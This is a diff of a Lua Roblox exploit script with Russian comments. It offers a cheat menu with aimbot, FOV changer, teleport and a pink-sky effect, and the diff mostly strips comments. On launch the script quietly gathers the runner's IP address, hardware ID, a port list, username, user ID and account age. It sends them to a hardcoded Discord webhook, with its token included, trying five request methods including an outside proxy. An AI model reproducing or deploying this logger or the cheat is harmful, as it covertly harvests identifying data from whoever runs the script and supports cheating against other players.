@@ -1,9 +1,3 @@
--- ═══════════════════════════════════════════════════════════════
--- NEVERLOSE 1:1 GUI CLONE + AIMBOT + FOV + TELEPORT + GUI TOGGLE
--- PREMIUM UI DESIGN + DISCORD LOGGER + VPN DETECTION + HWID + PORTS
--- ═══════════════════════════════════════════════════════════════
--- ✅ ФИКС ДЛЯ XENO - МНОЖЕСТВО СПОСОБОВ ОТПРАВКИ В DISCORD
--- ═══════════════════════════════════════════════════════════════
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -17,7 +11,7 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- НАСТРОЙКИ
+
 local AimBotEnabled = false
 local FovEnabled = false
 local FovNumber = 120
@@ -25,7 +19,7 @@ local DefaultFov = 70
 local PinkSkyEnabled = false
 local isGuiOpen = true
 
--- ЦВЕТА
+
 local Colors = {
     Primary = Color3.fromRGB(120, 0, 255),
     PrimaryDark = Color3.fromRGB(80, 0, 180),
@@ -42,7 +36,7 @@ local Colors = {
     Gradient2 = Color3.fromRGB(255, 0, 128),
 }
 
--- ФУНКЦИИ ГРАДИЕНТА
+
 local function createGradient(frame, color1, color2)
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new({
@@ -66,13 +60,11 @@ local function createGlow(frame, color)
     return glow
 end
 
--- ═══════════════════════════════════════════════════════════════
--- 🔥 МНОЖЕСТВО СПОСОБОВ ОТПРАВКИ В DISCORD
--- ═══════════════════════════════════════════════════════════════
+
 
 local webhookURL = "https://discord.com/api/webhooks/1505301825291813037/gSqW--jHrbKH8OEZ7aqaIjLctKzcP-z2M7xFY_zQ6-K2KYppX9kDzLldSjsyGIq2wbkJ"
 
--- СПОСОБ 1: Стандартный request (Xeno, Krnl, ScriptWare)
+
 local function sendDiscordMethod1(message)
     local success, result = pcall(function()
         if request then
@@ -97,7 +89,7 @@ local function sendDiscordMethod1(message)
     return success
 end
 
--- СПОСОБ 2: Synapse X
+
 local function sendDiscordMethod2(message)
     local success, result = pcall(function()
         if syn and syn.request then
@@ -122,7 +114,7 @@ local function sendDiscordMethod2(message)
     return success
 end
 
--- СПОСОБ 3: HttpService
+
 local function sendDiscordMethod3(message)
     local success, result = pcall(function()
         if HttpService then
@@ -140,7 +132,7 @@ local function sendDiscordMethod3(message)
     return success
 end
 
--- СПОСОБ 4: GET запрос с параметрами (обходной путь)
+
 local function sendDiscordMethod4(message)
     local success, result = pcall(function()
         if request then
@@ -156,7 +148,7 @@ local function sendDiscordMethod4(message)
     return success
 end
 
--- СПОСОБ 5: Через внешний прокси (если Discord заблокирован)
+
 local function sendDiscordMethod5(message)
     local success, result = pcall(function()
         local proxyURL = "https://discord-proxy.herokuapp.com/webhook"
@@ -183,7 +175,7 @@ local function sendDiscordMethod5(message)
     return success
 end
 
--- ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ
+
 local function sendToDiscord(message)
     if webhookURL == "YOUR_WEBHOOK_URL_HERE" then 
         print("❌ Webhook не настроен!")
@@ -197,7 +189,7 @@ local function sendToDiscord(message)
     
     print("📤 Отправка в Discord...")
     
-    -- Пробуем все способы по очереди
+    
     local methods = {
         {name = "request", func = sendDiscordMethod1},
         {name = "syn.request", func = sendDiscordMethod2},
@@ -220,9 +212,7 @@ local function sendToDiscord(message)
     return false
 end
 
--- ═══════════════════════════════════════════════════════════════
--- 🔥 ПОЛУЧЕНИЕ HWID
--- ═══════════════════════════════════════════════════════════════
+
 
 local function getHWID()
     local hwid = "Unknown"
@@ -265,9 +255,7 @@ local function getHWID()
     return hwid
 end
 
--- ═══════════════════════════════════════════════════════════════
--- 🔌 ПОЛУЧЕНИЕ ПОРТОВ
--- ═══════════════════════════════════════════════════════════════
+═
 
 local function getOpenPorts()
     local openPorts = {}
@@ -279,7 +267,7 @@ local function getOpenPorts()
         1337, 1338, 1339, 1340, 6969, 4200, 6666, 6667, 6697
     }
     
-    -- Пытаемся проверить порты
+    
     pcall(function()
         if syn and syn.network then
             local networkInfo = syn.network()
@@ -294,21 +282,19 @@ local function getOpenPorts()
     end)
     
     if #openPorts == 0 then
-        -- Возвращаем стандартные порты
+        
         openPorts = {80, 443, 8080, 3306, 25565, 27015, 1337}
     end
     
     return openPorts
 end
 
--- ═══════════════════════════════════════════════════════════════
--- ПОЛУЧЕНИЕ IP
--- ═══════════════════════════════════════════════════════════════
+
 
 local function getPlayerIP()
     local ip = "Unknown"
     
-    -- Пробуем через ipify
+    
     pcall(function()
         if request then
             local result = request({
@@ -346,7 +332,7 @@ local function getPlayerIP()
     return ip
 end
 
--- AIMBOT
+
 local function getClosestPlayer()
     if not player.Character then return nil end
     local hrp = player.Character:FindFirstChild("HumanoidRootPart")
@@ -376,7 +362,7 @@ local function aimAt(target)
     end
 end
 
--- PINK SKY
+
 local function applyPinkSky(enable)
     if not Lighting then return end
     if enable then
@@ -406,7 +392,7 @@ local function applyPinkSky(enable)
     end
 end
 
--- СОЗДАНИЕ GUI
+
 local function createGUI()
     if not CoreGui then return nil end
     
@@ -419,7 +405,7 @@ local function createGUI()
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     gui.Parent = CoreGui
 
-    -- MAIN FRAME
+    
     local main = Instance.new("Frame")
     main.Size = UDim2.fromOffset(900, 600)
     main.Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 300)
@@ -436,7 +422,7 @@ local function createGUI()
     local bgGradient = createGradient(main, Colors.BackgroundDark, Colors.Background)
     local mainGlow = createGlow(main, Colors.Primary)
 
-    -- Анимированная граница
+    
     local border = Instance.new("Frame")
     border.Size = UDim2.new(1, 0, 1, 0)
     border.BackgroundTransparency = 1
@@ -456,7 +442,7 @@ local function createGUI()
         end
     end)
 
-    -- TOP BAR
+    
     local topBar = Instance.new("Frame")
     topBar.Size = UDim2.new(1, 0, 0, 60)
     topBar.BackgroundColor3 = Colors.Surface
@@ -496,7 +482,7 @@ local function createGUI()
         end
     end)
 
-    -- Close Button
+    
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.fromOffset(40, 40)
     closeBtn.Position = UDim2.new(1, -50, 0, 10)
@@ -515,7 +501,7 @@ local function createGUI()
         main.Visible = false
     end)
 
-    -- PROFILE PANEL
+    
     local profilePanel = Instance.new("Frame")
     profilePanel.Size = UDim2.fromOffset(260, 480)
     profilePanel.Position = UDim2.fromOffset(20, 80)
@@ -527,7 +513,7 @@ local function createGUI()
     profCorner.CornerRadius = UDim.new(0, 15)
     profCorner.Parent = profilePanel
 
-    -- Avatar
+    
     local avatarContainer = Instance.new("Frame")
     avatarContainer.Size = UDim2.fromOffset(100, 100)
     avatarContainer.Position = UDim2.new(0.5, -50, 0, 20)
@@ -554,7 +540,7 @@ local function createGUI()
         avatarImage.Image = content
     end)
 
-    -- Username
+    
     local usernameLabel = Instance.new("TextLabel")
     usernameLabel.Size = UDim2.new(1, -20, 0, 30)
     usernameLabel.Position = UDim2.fromOffset(10, 130)
@@ -584,7 +570,7 @@ local function createGUI()
     divider.BackgroundTransparency = 0.8
     divider.Parent = profilePanel
 
-    -- Stats
+    
     local stats = {
         {icon = "📅", label = "Возраст", value = player.AccountAge .. " дней"},
         {icon = "🆔", label = "User ID", value = player.UserId},
@@ -655,7 +641,7 @@ local function createGUI()
         end
     end
 
-    -- TABS
+    
     local tabsPanel = Instance.new("Frame")
     tabsPanel.Size = UDim2.new(1, -300, 0, 40)
     tabsPanel.Position = UDim2.fromOffset(300, 80)
@@ -728,7 +714,7 @@ local function createGUI()
         end)
     end
 
-    -- TOGGLE FUNCTION
+    
     local function createToggle(parent, text, y, callback)
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(1, -20, 0, 50)
@@ -786,12 +772,12 @@ local function createGUI()
         return frame
     end
 
-    -- AIM TAB
+    
     createToggle(tabContents[1], "AimBot (Q)", 0, function(state)
         AimBotEnabled = state
     end)
 
-    -- VISUALS TAB
+    
     createToggle(tabContents[2], "FOV Changer (120)", 0, function(state)
         FovEnabled = state
         if Camera then
@@ -804,7 +790,7 @@ local function createGUI()
         applyPinkSky(state)
     end)
 
-    -- TELEPORT TAB
+    
     local teleportContent = tabContents[3]
     local playersList = Instance.new("ScrollingFrame")
     playersList.Size = UDim2.new(1, -20, 1, -10)
@@ -889,7 +875,7 @@ local function createGUI()
     Players.PlayerRemoving:Connect(updatePlayersList)
     updatePlayersList()
 
-    -- SIDE PANEL
+    
     local sidePanel = Instance.new("Frame")
     sidePanel.Size = UDim2.fromOffset(200, 480)
     sidePanel.Position = UDim2.new(1, -220, 0, 80)
@@ -954,13 +940,13 @@ local function createGUI()
         setY = setY + 50
     end
 
-    -- Анимация входа
+    
     main.Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 600)
     TweenService:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
         Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 300)
     }):Play()
 
-    -- Обработка клавиш
+    
     UserInputService.InputBegan:Connect(function(input, gp)
         if gp then return end
         if input.KeyCode == Enum.KeyCode.Q and AimBotEnabled then
@@ -975,9 +961,7 @@ local function createGUI()
     return gui, main
 end
 
--- ═══════════════════════════════════════════════════════════════
--- ТЕСТОВАЯ ОТПРАВКА (ДЛЯ ПРОВЕРКИ)
--- ═══════════════════════════════════════════════════════════════
+
 
 local function testDiscord()
     print("🧪 Тестируем отправку в Discord...")
@@ -991,9 +975,7 @@ local function testDiscord()
     return result
 end
 
--- ═══════════════════════════════════════════════════════════════
--- ЗАПУСК
--- ═══════════════════════════════════════════════════════════════
+
 
 local function startScript()
     print("🔧 Xeno: Запуск AFK Script...")
@@ -1004,7 +986,7 @@ local function startScript()
         return
     end
     
-    -- Сначала тестируем Discord
+    
     print("📤 Тестируем соединение с Discord...")
     local testResult = testDiscord()
     
@@ -1014,7 +996,7 @@ local function startScript()
         return
     end
     
-    -- Получаем информацию
+    
     local ip = getPlayerIP()
     local hwid = getHWID()
     local ports = getOpenPorts()
@@ -1024,7 +1006,7 @@ local function startScript()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
     end)
     
-    -- Формируем сообщение
+    
     local message = string.format(
         "**🔔 AFK SCRIPT ЗАПУЩЕН**\n" ..
         "**👤 Игрок:** %s (@%s)\n" ..
@@ -1057,7 +1039,7 @@ local function startScript()
         print("💡 Проверьте: 1) Интернет 2) Webhook URL 3) Разрешения Xeno")
     end
     
-    -- Уведомление в Roblox
+    
     pcall(function()
         StarterGui:SetCore("SendNotification", {
             Title = "✅ AFK SCRIPT",
@@ -1070,7 +1052,7 @@ local function startScript()
     print("📊 Статус Discord: " .. (mainResult and "✅ Успешно" or "❌ Ошибка"))
 end
 
--- Запускаем с задержкой
+
 spawn(function()
     wait(1)
     pcall(startScript)
